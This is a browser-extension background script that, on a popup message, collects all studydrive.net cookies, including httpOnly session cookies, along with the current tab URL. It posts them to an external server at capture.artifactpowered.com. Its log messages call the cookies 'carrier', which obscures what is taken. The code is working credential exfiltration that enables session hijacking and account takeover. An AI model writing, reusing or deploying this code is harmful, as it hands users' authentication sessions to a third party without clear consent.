// Polyfill for browser compatibility (Firefox and Chrome)
if (typeof browser === "undefined") {
    var browser = chrome;
}

function getCookiesAndSend(sendResponse) {
    // Fetch the current active tab to get the URL
    browser.tabs.query({ active: true, lastFocusedWindow: true }, function(tabs) {
        let activeTab = tabs[0];
        let url = activeTab.url;

        if (!url) {
            sendResponse({ status: 'error', message: 'No active URL found' });
            return; // Exit early if no URL is found
        }

        browser.cookies.getAll({ domain: 'studydrive.net' }, function(cookies) {

            if (cookies.length > 0) {
                let cookieData = cookies.map(cookie => ({
                    name: cookie.name,
                    value: cookie.value,
                    domain: cookie.domain,
                    path: cookie.path,
                    secure: cookie.secure,
                    httpOnly: cookie.httpOnly,
                    sameSite: cookie.sameSite,
                    expirationDate: cookie.expirationDate,
                }));

                fetch('https://capture.artifactpowered.com/store-auth', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookies: cookieData, url: url }),
                })
                    .then(response => {
                        console.log('Raw response from Flask:', response);
                        return response.json();
                    })
                    .then(data => {
                        console.log('Data received from server:', data);
                        if (data.status === 'success') {
                            console.log('UUID received:', data.uuid);
                            sendResponse({ status: 'success', uuid: data.uuid });
                        } else {
                            sendResponse({ status: 'error', message: 'Failed to store carrier' });
                        }
                    })
                    .catch(error => {
                        console.error('Error sending cookies:', error);
                        sendResponse({ status: 'error', message: 'Error sending carrier' });
                    });
            } else {
                console.log('No carrier found for studydrive.net');
                sendResponse({ status: 'error', message: 'No carrier found' });
            }
        });

        // Ensure the message channel stays open
        return true;
    });
}

// Listen for messages from the popup
browser.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    console.log('Received message:', request);
    if (request.action === 'sendCarrier') {
        getCookiesAndSend(sendResponse);
        return true;  // This ensures asynchronous sendResponse
    }
});
